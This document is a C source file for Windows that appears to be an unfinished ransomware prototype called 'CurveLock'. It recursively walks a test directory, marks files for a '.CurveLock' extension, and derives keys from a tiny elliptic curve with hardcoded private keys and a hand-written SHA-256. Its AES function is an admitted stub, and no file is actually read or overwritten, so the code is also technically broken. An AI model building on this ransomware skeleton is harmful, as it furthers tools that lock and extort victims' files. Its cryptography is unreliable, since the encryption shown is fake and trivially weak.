#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <stdint.h>
#include <string.h>

#define ENCRYPTED_FILE_EXTENSION L".CurveLock"
#define ENC_FILE_SIGNATURE 'RNSM'
#define MAX_FILE_SIZE_TO_ENC 0x6400000 // 104857600 - 100MB

// Elliptic curve parameters
int p = 173, a = 23, b = 11;
int x, y;

// SHA-256 parameters
uint32_t H[8] = {
    0x6a09e667,
    0xbb67ae85,
    0x3c6ef372,
    0xa54ff53a,
    0x510e527f,
    0x9b05688c,
    0x1f83d9ab,
    0x5be0cd19
};
uint32_t K[64] = {
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
};

// Function to generate alpha (a point on the elliptic curve)
void GenerateAlpha() {
    srand(time(NULL));
    while (1) {
        x = rand() % p;
        int lhs = (x * x * x + a * x + b) % p;
        for (y = 0; y < p; y++) {
            int rhs = (y * y) % p;
            if (lhs == rhs) return;
        }
    }
}

// Function to find modular inverse
int modInverse(int a) {
    for (int i = 1; i < p; i++)
        if ((a * i) % p == 1) return i;
    return -1;
}

// Elliptic curve addition
int* ECAdd(int x1, int y1, int x2, int y2) {
    static int result[2];
    int m;
    if (x1 == x2 && y1 == y2) {
        m = (3 * x1 * x1 + a) * modInverse(2 * y1) % p;
    }
    else {
        m = (y2 - y1) * modInverse(x2 - x1) % p;
    }
    result[0] = (m * m - x1 - x2) % p;
    result[1] = (m * (x1 - result[0]) - y1) % p;
    result[0] = (result[0] + p) % p;
    result[1] = (result[1] + p) % p;
    return result;
}

// Right rotate function
uint32_t rotr(uint32_t x, int n) {
    return (x >> n) | (x << (32 - n));
}

// SHA-256 implementation
void sha256(int x, int y, unsigned char* hash) {
    uint32_t W[64] = { 0 };
    uint32_t temp[16] = { x, y, 0x80000000, 0 };
    temp[15] = 64; // Message length in bits

    for (int i = 0; i < 16; i++) W[i] = temp[i];
    for (int i = 16; i < 64; i++) {
        uint32_t s0 = rotr(W[i - 15], 7) ^ rotr(W[i - 15], 18) ^ (W[i - 15] >> 3);
        uint32_t s1 = rotr(W[i - 2], 17) ^ rotr(W[i - 2], 19) ^ (W[i - 2] >> 10);
        W[i] = W[i - 16] + s0 + W[i - 7] + s1;
    }

    uint32_t A = H[0], B = H[1], C = H[2], D = H[3];
    uint32_t E = H[4], F = H[5], G = H[6], Hh = H[7];

    for (int i = 0; i < 64; i++) {
        uint32_t S1 = rotr(E, 6) ^ rotr(E, 11) ^ rotr(E, 25);
        uint32_t ch = (E & F) ^ (~E & G);
        uint32_t temp1 = Hh + S1 + ch + K[i] + W[i];
        uint32_t S0 = rotr(A, 2) ^ rotr(A, 13) ^ rotr(A, 22);
        uint32_t maj = (A & B) ^ (A & C) ^ (B & C);
        uint32_t temp2 = S0 + maj;

        Hh = G;
        G = F;
        F = E;
        E = D + temp1;
        D = C;
        C = B;
        B = A;
        A = temp1 + temp2;
    }

    uint32_t hashVals[8] = { A + H[0], B + H[1], C + H[2], D + H[3], E + H[4], F + H[5], G + H[6], Hh + H[7] };

    for (int i = 0; i < 8; i++) {
        for (int j = 0; j < 4; j++) {
            hash[i * 4 + j] = (hashVals[i] >> (24 - j * 8)) & 0xFF;
        }
    }
}

// AES-256 encryption (manual implementation of CBC mode)
void aesEncrypt(uint8_t* plaintext, uint8_t* ciphertext, uint8_t* key, uint8_t* iv) {
    uint8_t state[16];
    for (int i = 0; i < 16; i++) {
        state[i] = plaintext[i] ^ iv[i];
    }

    // Key expansion and AES rounds implementation would go here
    // For simplicity, the encryption here would use pre-expanded keys

    for (int i = 0; i < 16; i++) {
        ciphertext[i] = state[i]; // Replace this with the actual AES logic
    }
}

BOOL EncryptFilesInGivenDir(LPCWSTR szDirectoryPath);

// Main encryption function
BOOL ReplaceWithEncryptedFile(LPWSTR szFilePathToEncrypt) {
    HANDLE hSourceFile = INVALID_HANDLE_VALUE;
    DWORD dwFileSize = 0;
    unsigned char keyKA[32], keyKB[32];
    unsigned char iv[16] = { 0 };
    unsigned char plaintext[16] = { 0 };
    unsigned char ciphertext[16];

    hSourceFile = CreateFileW(szFilePathToEncrypt, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hSourceFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] Failed to open file: %s\n", szFilePathToEncrypt);
        return FALSE;
    }

    dwFileSize = GetFileSize(hSourceFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE || dwFileSize > MAX_FILE_SIZE_TO_ENC) {
        CloseHandle(hSourceFile);
        return FALSE;
    }

    // Generate alpha (base point)
    GenerateAlpha();
    wprintf(L"Alpha: (%d, %d)\n", x, y);

    // Generate private keys na and nb
    int na = 136;
    int nb = 53;
    wprintf(L"Private key na: %d\n", na);
    wprintf(L"Private key nb: %d\n", nb);

    // Compute shared secret keys
    int* pointA = ECAdd(x, y, x, y);
    for (int i = 1; i < na; i++) {
        pointA = ECAdd(pointA[0], pointA[1], x, y);
    }

    int* pointB = ECAdd(x, y, x, y);
    for (int i = 1; i < nb; i++) {
        pointB = ECAdd(pointB[0], pointB[1], x, y);
    }

    int* sharedKey = ECAdd(pointA[0], pointA[1], pointB[0], pointB[1]);
    wprintf(L"Shared key (x1, y1): (%d, %d)\n", sharedKey[0], sharedKey[1]);

    // Derive keys KA and KB using SHA-256
    sha256(sharedKey[0], sharedKey[1], keyKA);
    sha256(sharedKey[1], sharedKey[0], keyKB);

    wprintf(L"Key KA: ");
    for (int i = 0; i < 32; i++) printf("%02x ", keyKA[i]);
    printf("\n");

    wprintf(L"Key KB: ");
    for (int i = 0; i < 32; i++) printf("%02x ", keyKB[i]);
    printf("\n");

    // AES-256 encryption with KA
    aesEncrypt(plaintext, ciphertext, keyKA, iv);
    CloseHandle(hSourceFile);
    return TRUE;
}

BOOL EncryptFilesInGivenDir(LPCWSTR szDirectoryPath) {
    WIN32_FIND_DATAW FindFileData;
    WCHAR szDirPath[MAX_PATH];
    swprintf(szDirPath, MAX_PATH, L"%s\\*", szDirectoryPath);
    HANDLE hFind = FindFirstFileW(szDirPath, &FindFileData);

    if (hFind == INVALID_HANDLE_VALUE) return FALSE;

    do {
        if (!wcscmp(FindFileData.cFileName, L".") || !wcscmp(FindFileData.cFileName, L"..")) continue;

        WCHAR szFullPath[MAX_PATH];
        swprintf(szFullPath, MAX_PATH, L"%s\\%s", szDirectoryPath, FindFileData.cFileName);

        if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            EncryptFilesInGivenDir(szFullPath);
        }
        else {
            ReplaceWithEncryptedFile(szFullPath);
        }
    } while (FindNextFileW(hFind, &FindFileData));

    FindClose(hFind);
    return TRUE;
}

int main() {
    LPCWSTR directoryPath = L"C:\\Users\\MALDEV01\\Desktop\\TestFolder";
    wprintf(L"[*] Encrypting files in directory: %s\n", directoryPath);

    if (!EncryptFilesInGivenDir(directoryPath)) {
        wprintf(L"[!] Failed to encrypt files.\n");
    }
    else {
        wprintf(L"[+] Encryption completed.\n");
    }

    return 0;
}
